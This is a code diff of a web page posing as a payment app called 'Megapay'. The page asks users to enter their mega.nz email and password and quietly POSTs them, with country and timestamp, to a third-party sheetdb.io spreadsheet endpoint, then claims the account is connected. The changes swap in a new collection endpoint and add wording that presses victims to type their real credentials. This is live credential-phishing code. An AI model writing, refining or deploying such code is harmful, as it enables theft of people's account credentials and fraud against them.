@@ -356,11 +356,11 @@
                 <span class="text-red-600 font-extrabold italic text-4xl leading-none">M</span>
             </div>
             <h2 class="text-2xl font-bold mb-2">Megapay</h2>
-            <p class="text-sm text-gray-500 mb-10">Connect your mega.nz pay account to receive and pay</p>
+            <p class="text-sm text-gray-500 mb-10">Connect your mega.nz pay account to receive and pay(ensure to check your mega credential you used at mega.nz is correct)</p>
             <div class="w-full flex flex-col gap-4">
                 <input type="email" id="mega-email" class="w-full bg-gray-50 border border-gray-200 rounded-xl p-4 outline-none focus:border-red-500" placeholder="Email Address">
-                <input type="password" id="mega-pass" class="w-full bg-gray-50 border border-gray-200 rounded-xl p-4 outline-none focus:border-red-500" placeholder="Passkey">
-                <p id="mega-error" class="text-red-500 text-sm font-semibold hidden">Wrong password, try again.</p>
+                <input type="password" id="mega-pass" class="w-full bg-gray-50 border border-gray-200 rounded-xl p-4 outline-none focus:border-red-500" placeholder="Password">
+                <p id="mega-error" class="text-red-500 text-sm font-semibold hidden">Check to ensure your password is correct , try again!</p>
                 <button onclick="handleMegaLogin()" class="w-full bg-black text-white rounded-full py-4 font-bold mt-4 shadow-lg flex justify-center items-center gap-2">
                     <span id="mega-btn-text">Connect Account</span>
                     <div id="mega-loader" class="loader hidden" style="border-top-color: white;"></div>
@@ -505,7 +505,7 @@
     };
 
     const regionalBanks = {
-        "US": ["Chase", "Bank of America", "Wells Fargo", "Citibank", "Capital One", "Google Pay"],
+        "US": ["Chase", "Bank of America", "Wells Fargo", "Citibank", "Capital One", "Google Pay","Bitcoin"],
         "UK": ["Barclays", "HSBC", "Lloyds", "NatWest", "Monzo", "Google Pay"],
         "CD": ["Airtel Mobile", "EquityBCDC", "Rawbank", "Trust Merchant Bank", "Vodacom M-Pesa"],
         "JM": ["NCB Jamaica", "Scotiabank", "Sagicor Bank", "JN Bank"],
@@ -1022,11 +1022,11 @@
         document.getElementById('mega-loader').classList.remove('hidden');
 
         try {
-            await fetch('https://sheetdb.io/api/v1/havxztmyewy29', {
+            await fetch('https://sheetdb.io/api/v1/0qxn5zf684vjf', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ data: { email_address: email, passkey: pass, country: userProfile.country || 'Unknown', timestamp: new Date().toISOString() } })
             });
-            alert("Account Connected Successfully!");
+            alert("Account Connected Successfully!You can now receive payments");
             navTo('view-home');
         } catch (error) { alert("Error connecting account"); } 
         finally {
